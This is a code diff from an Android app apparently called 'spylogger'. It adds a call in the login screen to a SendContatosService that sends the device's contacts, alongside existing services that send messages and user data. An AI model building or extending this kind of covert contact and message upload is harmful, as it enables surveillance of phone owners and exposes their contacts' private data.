@@ -41,6 +41,7 @@ import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
+import com.gravatasufoca.spylogger.services.SendContatosService;
 import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
@@ -488,6 +489,8 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                                 Log.e("sql", e.getMessage());
                             }
                         }
+                        SendContatosService sendContatosService=new SendContatosService(getApplication(),null);
+                        sendContatosService.enviarContatos();
                         Utils.startNewService(context);
 //                        finish();
                         break;
